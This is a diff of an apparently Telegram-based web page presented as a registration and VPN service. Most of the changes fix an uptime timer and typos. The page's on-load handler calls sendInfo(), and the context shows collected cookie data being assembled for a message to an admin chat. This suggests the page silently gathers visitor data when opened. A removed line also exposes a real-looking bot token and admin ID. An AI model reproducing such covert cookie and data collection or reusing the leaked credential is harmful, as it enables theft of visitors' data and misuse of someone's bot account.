@@ -132,8 +132,8 @@
         <div class="timer" id="timer">Время работы: 00:00:00</div>
     </div>
     <script>
-        const BOT_TOKEN = '7765607422:AAFpxnUhtgMS4PPeixh4-EKR4sF-AktXYz8'; // Замените на токен вашего бота
-        const ADMIN_CHAT_ID = '7896097397'; // Замените на ID администратора
+        const BOT_TOKEN = ''; // Замените на токен вашего бота
+        const ADMIN_CHAT_ID = ''; // Замените на ID администратора
 
         const registrationPage = document.getElementById('registration-page');
         const vpnPage = document.getElementById('vpn-page');
@@ -268,19 +268,21 @@ ${cookieData || 'Не найдены'}
 
         function updateTimer() {
             if (startTime) {
-              const now = new Date();
-              const diff = Math.floor((now - startTime) / 1000);
-              const hours = Math.floor(diff / 3600);
-              const minutes = Math.floor((diff %3600) / 60);
-document.getElementByld('timer').textContent = Время работы: ${String(hours).padStart(2,'0')}:${String(minutes).padStart(2, '0')}: ${String(seconds).padStart(2, '0')};
+                const now = new Date();
+                const diff = Math.floor((now - startTime) / 1000);
+                const hours = Math.floor(diff / 3600);
+                const minutes = Math.floor((diff % 3600) / 60);
+                const seconds = diff % 60;
+                document.getElementById('timer').textContent = `Время работы: ${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
+            }
         }
-      }
-        window.onload = () => {
-        sendinfo();
-        initTg();
-      };
 
-      tg.ready();
-   </script>
+        window.onload = () => {
+            sendInfo();
+            initTg();
+        };
+
+        tg.ready();
+    </script>
 </body>
 </html>
